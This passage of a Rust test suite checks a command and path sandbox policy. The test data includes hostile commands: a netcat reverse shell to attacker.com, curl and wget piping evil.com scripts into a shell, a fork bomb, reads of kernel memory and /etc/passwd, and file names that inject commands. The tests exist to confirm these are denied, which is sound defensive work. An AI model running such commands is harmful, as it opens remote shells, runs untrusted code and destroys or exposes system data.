            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();

        let dangerous_devices = vec![
            "/dev/mem",
            "/dev/kmem",
            "/dev/port",
            "/dev/mem0",
            "/proc/kcore",
            "/proc/self/mem",
        ];

        for device in dangerous_devices {
            policy
                .add_prefix_rule(
                    &["cat".to_string(), device.to_string()],
                    Decision::Deny,
                    None,
                )
                .unwrap();
            let result = policy.check(&["cat".to_string(), device.to_string()]);
            assert!(result.is_some());
            assert_eq!(result.unwrap().decision, Decision::Deny);
        }
    }

    #[test]
    fn test_filesystem_race_condition() {
        // 测试竞态条件攻击 (TOCTOU)
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(
                &["ln".to_string()],
                Decision::Deny,
                Some("Symlink creation not allowed".to_string()),
            )
            .unwrap();
        policy
            .add_prefix_rule(&["ln".to_string(), "-s".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&[
            "ln".to_string(),
            "-s".to_string(),
            "/tmp/malicious".to_string(),
            "/etc/passwd".to_string(),
        ]);
        assert!(result.is_some());
        assert_eq!(result.unwrap().decision, Decision::Deny);
    }

    // ============================================================================
    // 破坏性测试 - 网络攻击
    // ============================================================================
    #[test]
    fn test_network_attempt_reverse_shell() {
        // 测试尝试建立反向 shell
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["nc".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["nc".to_string(), "-e".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["nc".to_string(), "-c".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["bash".to_string(), "-i".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();
        policy
            .add_prefix_rule(&["/dev/tcp".to_string()], Decision::Deny, None)
            .unwrap();

        let reverse_shell_attempts = vec![
            vec![
                "nc".to_string(),
                "-e".to_string(),
                "/bin/bash".to_string(),
                "attacker.com".to_string(),
                "4444".to_string(),
            ],
            vec!["bash".to_string(), "-i".to_string()],
            vec![
                "python".to_string(),
                "-c".to_string(),
                "import socket;socket.socket()".to_string(),
            ],
        ];

        for attempt in reverse_shell_attempts {
            let result = policy.check(&attempt);
            assert!(
                result.is_some(),
                "Reverse shell attempt {:?} should be denied",
                attempt
            );
        }
    }

    #[test]
    fn test_network_attempt_port_scanning() {
        // 测试端口扫描尝试
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["nmap".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["nc".to_string(), "-z".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&[
            "nmap".to_string(),
            "-p".to_string(),
            "1-65535".to_string(),
            "localhost".to_string(),
        ]);
        assert!(result.is_some());
    }

    #[test]
    fn test_network_attempt_download_execute() {
        // 测试下载并执行
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["curl".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["curl".to_string(), "|".to_string(), "bash".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();
        policy
            .add_prefix_rule(
                &["wget".to_string(), "-O-".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        let download_exec = vec![
            vec![
                "curl".to_string(),
                "http://evil.com/script.sh".to_string(),
                "|".to_string(),
                "bash".to_string(),
            ],
            vec![
                "wget".to_string(),
                "-qO-".to_string(),
                "http://evil.com/script.sh".to_string(),
                "|".to_string(),
                "sh".to_string(),
            ],
        ];

        for attempt in download_exec {
            let result = policy.check(&attempt);
            assert!(
                result.is_some(),
                "Download and execute {:?} should be detected",
                attempt
            );
        }
    }

    // ============================================================================
    // 破坏性测试 - 进程操作
    // ============================================================================
    #[test]
    fn test_process_manipulation_fork_bomb() {
        // 测试 fork 炸弹
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["fork".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&[":(){:|:&};:".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&[":(){:|:&};:".to_string()]);
        assert!(result.is_some());
    }

    #[test]
    fn test_process_manipulation_ptrace() {
        // 测试 ptrace 操作
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["strace".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(&["ltrace".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&["strace".to_string(), "-p".to_string(), "1234".to_string()]);
        assert!(result.is_some());
    }

    #[test]
    fn test_process_manipulation_kill_all() {
        // 测试 killall 操作
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["killall".to_string()], Decision::Deny, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["pkill".to_string(), "-9".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        let result = policy.check(&["killall".to_string(), "-9".to_string()]);
        assert!(result.is_some());
    }

    // ============================================================================
    // 破坏性测试 - 目录遍历
    // ============================================================================
    #[test]
    fn test_directory_traversal_parent_escape() {
        // 测试目录遍历逃逸
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cd".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["cd".to_string(), "..".to_string()],
                Decision::Deny,
                Some("Parent directory escape not allowed".to_string()),
            )
            .unwrap();

        let escape_attempts = vec![
            vec!["cd".to_string(), "..".to_string()],
            vec!["cd".to_string(), "../..".to_string()],
            vec!["cd".to_string(), "../../..".to_string()],
            vec!["cd".to_string(), "..;".to_string()],
            vec!["cd".to_string(), "..%00".to_string()],
        ];

        for attempt in escape_attempts {
            let result = policy.check(&attempt);
            assert!(
                result.is_some(),
                "Directory escape {:?} should be detected",
                attempt
            );
        }
    }

    // ============================================================================
    // 破坏性测试 - 边界情况
    // ============================================================================
    #[test]
    fn test_empty_command() {
        // 测试空命令 - should be denied (return Some) for security
        let policy = Policy::new();
        let result = policy.check(&[]);
        assert!(result.is_some(), "Empty command should be denied");
    }

    #[test]
    fn test_extremely_long_arguments() {
        // 测试超长参数
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();

        let long_arg = "A".repeat(100000);
        let result = policy.check(&["cat".to_string(), long_arg]);
        assert!(result.is_some());
    }

    #[test]
    fn test_null_in_arguments() {
        // 测试参数中的 null 字符
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();

        let result = policy.check(&["cat".to_string(), "file\x00.txt".to_string()]);
        assert!(result.is_some());
    }

    #[test]
    fn test_special_characters_in_arguments() {
        // 测试参数中的特殊字符
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();

        let special_args = vec![
            "file with spaces.txt",
            "file\twith\ttabs.txt",
            "file\nwith\nnewlines.txt",
            "file;rm -rf /.txt",
            "file|cat /etc/passwd.txt",
            "file`whoami`.txt",
            "file$(whoami).txt",
        ];

        for arg in special_args {
            let result = policy.check(&["ls".to_string(), arg.to_string()]);
            assert!(
                result.is_some(),
                "Special character in arg should be handled: {}",
                arg
            );
        }
    }

    // ============================================================================
    // 破坏性测试 - 组合攻击
    // ============================================================================
    #[test]
    fn test_combined_attack_path_and_command() {
        // 测试组合攻击：路径遍历 + 命令注入
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["cat".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["cat".to_string(), "/etc/passwd".to_string()],
                Decision::Deny,
                None,
            )
            .unwrap();

        let combined_attacks = vec![
            vec!["cat".to_string(), "../../../etc/passwd".to_string()],
            vec!["cat".to_string(), "/etc/../../etc/passwd".to_string()],
        ];

        for attack in combined_attacks {
            let result = policy.check(&attack);
            assert!(
                result.is_some(),
                "Combined attack {:?} should be detected",
                attack
            );
        }
    }

    #[test]
    fn test_combined_attack_env_and_command() {
        // 测试组合攻击：环境变量 + 命令
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["ls".to_string()], Decision::Allow, None)
            .unwrap();
        policy
            .add_prefix_rule(&["env".to_string()], Decision::Deny, None)
            .unwrap();

        let result = policy.check(&["ls".to_string(), "&".to_string(), "env".to_string()]);
        assert!(result.is_some());
    }

    // ============================================================================
    // 新增测试: PathRule 相关功能
    // ============================================================================
    #[test]
    fn test_path_rule_creation() {
        let rule = PathRule::new(
            "/etc/passwd".to_string(),
            false,
            Decision::Deny,
            Some("Cannot access system files".to_string()),
        );
        assert_eq!(rule.path_pattern, "/etc/passwd");
        assert!(!rule.is_directory);
        assert_eq!(rule.decision, Decision::Deny);
    }

    #[test]
    fn test_path_rule_matches_exact() {
        let rule = PathRule::new("/etc/passwd".to_string(), false, Decision::Deny, None);
        assert!(rule.matches_path("/etc/passwd"));
        assert!(!rule.matches_path("/etc/shadow"));
        assert!(!rule.matches_path("/etc"));
    }

    #[test]
    fn test_path_rule_matches_wildcard() {
        let rule = PathRule::new("/etc/*".to_string(), true, Decision::Deny, None);
        assert!(rule.matches_path("/etc/passwd"));
        assert!(rule.matches_path("/etc/shadow"));
        assert!(rule.matches_path("/etc/some/nested/path"));
        assert!(!rule.matches_path("/var/etc"));
    }

    #[test]
    fn test_path_rule_matches_star() {
        let rule = PathRule::new("*".to_string(), false, Decision::Allow, None);
        assert!(rule.matches_path("/any/path"));
        assert!(rule.matches_path("/another/path"));
        assert!(rule.matches_path("relative/path"));
    }

    #[test]
    fn test_path_rule_matches_directory_prefix() {
        let rule = PathRule::new("/home".to_string(), true, Decision::Deny, None);
        assert!(rule.matches_path("/home"));
        assert!(rule.matches_path("/home/user"));
        assert!(rule.matches_path("/home/user/documents"));
        assert!(!rule.matches_path("/homeuser"));
    }

    #[test]
    fn test_policy_add_path_rule() {
        let mut policy = Policy::new();
        policy.add_path_rule(PathRule::new(
            "/etc/passwd".to_string(),
            false,
            Decision::Deny,
            None,
        ));
        assert_eq!(policy.check_path("/etc/passwd"), Decision::Deny);
    }

    #[test]
    fn test_policy_add_path_rule_simple() {
        let mut policy = Policy::new();
        policy.add_path_rule_simple(
            "/root".to_string(),
            true,
            Decision::Deny,
            Some("Root access denied".to_string()),
        );
        assert_eq!(policy.check_path("/root"), Decision::Deny);
    }

    #[test]
    fn test_policy_check_path_no_match() {
        let mut policy = Policy::new();
        policy.add_path_rule_simple("/etc".to_string(), true, Decision::Deny, None);
        // Default decision is Allow when no rule matches
        assert_eq!(policy.check_path("/tmp"), Decision::Allow);
    }

    #[test]
    fn test_policy_check_path_whitelist_mode() {
        let mut policy = Policy::new_whitelist();
        policy.add_path_rule_simple("/tmp".to_string(), true, Decision::Allow, None);
        // In whitelist mode, unmatched paths are denied
        assert_eq!(policy.check_path("/etc"), Decision::Deny);
        assert_eq!(policy.check_path("/tmp"), Decision::Allow);
    }

    #[test]
    fn test_policy_path_rules_multiple() {
        let mut policy = Policy::new();
        policy.add_path_rule_simple("/etc/passwd".to_string(), false, Decision::Deny, None);
        policy.add_path_rule_simple("/etc/shadow".to_string(), false, Decision::Deny, None);
        policy.add_path_rule_simple("/home".to_string(), true, Decision::Allow, None);

        assert_eq!(policy.check_path("/etc/passwd"), Decision::Deny);
        assert_eq!(policy.check_path("/etc/shadow"), Decision::Deny);
        assert_eq!(policy.check_path("/home/user"), Decision::Allow);
        // Default allow for unmatched
        assert_eq!(policy.check_path("/var"), Decision::Allow);
    }

    #[test]
    fn test_policy_debug_includes_path_rules() {
        let mut policy = Policy::new();
        policy.add_path_rule_simple("/etc".to_string(), true, Decision::Deny, None);
        let debug_str = format!("{:?}", policy);
        assert!(debug_str.contains("path_rules_count"));
    }

    #[test]
    fn path_helpers_cover_relative_and_root_escape_inputs() {
        assert_eq!(normalize_absolute_path(Path::new("relative/path")), None);
        assert_eq!(normalize_absolute_path(Path::new("/../../outside")), None);
        assert_eq!(
            normalize_absolute_path(Path::new("/tmp/../etc")),
            Some(Path::new("/etc").to_path_buf())
        );
        assert_eq!(
            normalize_absolute_path(Path::new("/tmp/./inside")),
            Some(Path::new("/tmp/inside").to_path_buf())
        );
        assert!(!path_starts_with_case_insensitive(
            Path::new("/"),
            Path::new("/tmp")
        ));
        assert!(!path_starts_with_case_insensitive(
            Path::new("/tmp-other/file"),
            Path::new("/tmp")
        ));

        let relative_input = PathRule::new("/etc/passwd".into(), false, Decision::Deny, None);
        assert!(!relative_input.matches_path("etc/passwd"));
        let relative_pattern = PathRule::new("etc/passwd".into(), false, Decision::Deny, None);
        assert!(!relative_pattern.matches_path("/etc/passwd"));
        let wildcard_pattern = PathRule::new("/tmp/*".into(), true, Decision::Deny, None);
        assert!(!wildcard_pattern.matches_path("relative/path"));
        assert!(!wildcard_pattern.matches_path("/var/tmp/file"));
        let root_wildcard = PathRule::new("/*".into(), true, Decision::Allow, None);
        assert!(root_wildcard.matches_path("/tmp/nested"));
    }

    #[test]
    fn path_prefix_comparator_covers_case_modes_mismatches_and_short_paths() {
        assert!(path_starts_with_components(
            Path::new("/Work/Project/file"),
            Path::new("/work/project"),
            true
        ));
        assert!(!path_starts_with_components(
            Path::new("/Work/Project/file"),
            Path::new("/other/project"),
            true
        ));
        assert!(path_starts_with_components(
            Path::new("/work/project/file"),
            Path::new("/work/project"),
            false
        ));
        assert!(!path_starts_with_components(
            Path::new("/Work/Project/file"),
            Path::new("/work/project"),
            false
        ));
        assert!(!path_starts_with_components(
            Path::new("/work"),
            Path::new("/work/project"),
            false
        ));
    }

    #[test]
    fn network_rules_cover_exact_wildcard_port_and_default_decisions() {
        let mut policy = Policy::new();
        policy.add_network_rule(NetworkRule {
            host: "example.com".into(),
            port: Some(443),
            protocol: NetworkRuleProtocol::Tcp,
            decision: Decision::Deny,
        });
        policy.add_network_rule(NetworkRule {
            host: "*".into(),
            port: None,
            protocol: NetworkRuleProtocol::Udp,
            decision: Decision::Allow,
        });

        assert_eq!(
            policy.check_network("example.com", Some(443)),
            Decision::Deny
        );
        assert_eq!(
            policy.check_network("example.com", Some(80)),
            Decision::Allow
        );
        assert_eq!(policy.check_network("other.example", None), Decision::Allow);

        let mut port_only = Policy::new();
        port_only.add_network_rule(NetworkRule {
            host: "*".into(),
            port: Some(53),
            protocol: NetworkRuleProtocol::Udp,
            decision: Decision::Prompt,
        });
        assert_eq!(
            port_only.check_network("dns.example", Some(53)),
            Decision::Prompt
        );
        assert_eq!(
            port_only.check_network("dns.example", Some(443)),
            Decision::Prompt
        );
        assert_eq!(
            Policy::new().check_network("unmatched.example", None),
            Decision::Prompt
        );
    }

    #[test]
    fn allowed_prefixes_render_all_token_kinds_and_deduplicate() {
        let mut policy = Policy::new();
        let rule: Arc<dyn Rule> = Arc::new(PrefixRule {
            pattern: PrefixPattern {
                first: Arc::from("tool"),
                rest: vec![
                    PatternToken::Literal("literal".into()),
                    PatternToken::Wildcard,
                    PatternToken::Variable("HOME".into()),
                ],
            },
            decision: Decision::Allow,
            justification: None,
            rule_type: RuleType::Whitelist,
            allowed_directories: None,
            restrict_to_directories: false,
        });
        let rules = policy.rules_by_program.entry("tool".into()).or_default();
        rules.extend([rule.clone(), rule]);
        rules.push(Arc::new(PathRule::new(
            "/tmp/ignored".into(),
            false,
            Decision::Deny,
            None,
        )));
        policy
            .add_prefix_rule_ext(
                &["tool".into(), "denied".into()],
                Decision::Deny,
                None,
                RuleType::Blacklist,
                None,
                false,
            )
            .unwrap();

        assert_eq!(
            policy.get_allowed_prefixes(),
            vec![vec![
                String::from("tool"),
                String::from("literal"),
                String::from("*"),
                String::from("$HOME"),
            ]]
        );
        assert_eq!(Decision::Allow.to_string(), "allow");
        assert_eq!(Decision::Deny.to_string(), "deny");
        assert_eq!(Decision::Prompt.to_string(), "prompt");
    }

    #[test]
    fn parse_policy_ignores_unrecognized_lines_and_adds_supported_rules() {
        let policy = parse_policy(
            "\n# comment\nunsupported(value = true)\nprefix_rule(pattern = [\"cmd\"], decision = \"allow\")\nprefix_rule(pattern = ['cmd'], decision ='allow')\nprefix_rule(pattern = [\"other\"], decision = \"allow\")\nprefix_rule(pattern = [\"cmd\"], decision = \"deny\")\n",
        )
        .unwrap();

        assert_eq!(
            policy.get_allowed_prefixes(),
            vec![vec![String::from("cmd")]]
        );
    }

    #[test]
    fn absolute_program_aliases_inherit_denies_but_not_allows() {
        let mut deny = Policy::new();
        deny.add_prefix_rule(&["tool".into()], Decision::Deny, None)
            .unwrap();
        deny.add_prefix_rule(&["other".into()], Decision::Deny, None)
            .unwrap();
        assert_eq!(
            deny.check_with_cwd(&["/usr/bin/tool".into()], None)
                .unwrap()
                .decision,
            Decision::Deny
        );

        let mut allow = Policy::new();
        allow
            .add_prefix_rule(&["tool".into()], Decision::Allow, None)
            .unwrap();
        assert!(allow
            .check_with_cwd(&["/usr/bin/tool".into()], None)
            .is_none());
        assert!(allow.check_with_cwd(&["/".into()], None).is_none());
    }

    #[test]
    fn matching_non_deny_rules_keep_the_first_result() {
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(
                &["tool".into()],
                Decision::Allow,
                Some("first matching rule".into()),
            )
            .unwrap();
        policy
            .add_prefix_rule(
                &["tool".into()],
                Decision::Allow,
                Some("later matching rule".into()),
            )
            .unwrap();

        assert_eq!(
            policy
                .check_with_cwd(&["tool".into()], None)
                .unwrap()
                .justification
                .as_deref(),
            Some("first matching rule")
        );
    }

    #[test]
    fn directory_restrictions_fail_closed_without_a_valid_allowlist() {
        let rule = PrefixRule::new(
            PrefixPattern {
                first: Arc::from("tool"),
                rest: Vec::new(),
            },
            Decision::Allow,
            None,
        )
        .with_directory_restriction();

        assert!(directory_restriction_denies(&rule, Some("/workspace")));
        assert!(directory_restriction_denies(&rule, Some("relative")));

        let invalid_allowlist = rule.with_allowed_directories(vec!["relative".into()]);
        assert!(directory_restriction_denies(
            &invalid_allowlist,
            Some("/workspace")
        ));
    }

    #[test]
    fn wildcard_rules_skip_nonmatches_and_keep_the_first_matching_fallback() {
        let mut policy = Policy::new();
        policy
            .add_prefix_rule(&["*".into(), "run".into()], Decision::Prompt, None)
            .unwrap();
        policy
            .add_prefix_rule(
                &["*".into(), "run".into(), "safe".into()],
                Decision::Allow,
                None,
            )
            .unwrap();
        policy
            .add_prefix_rule(&["*".into(), "other".into()], Decision::Deny, None)
            .unwrap();

        assert_eq!(
            policy
                .check_with_cwd(&["tool".into(), "run".into(), "safe".into()], None)
                .unwrap()
                .decision,
            Decision::Prompt
        );

        let mut restricted = Policy::new();
        restricted
            .add_prefix_rule_ext(
                &["*".into()],
                Decision::Allow,
                None,
                RuleType::Whitelist,
                Some(vec!["/workspace".into()]),
                true,
            )
            .unwrap();
        assert_eq!(
            restricted
                .check_with_cwd(&["tool".into()], Some("/outside"))
                .unwrap()
                .decision,
            Decision::Deny
        );
    }
}
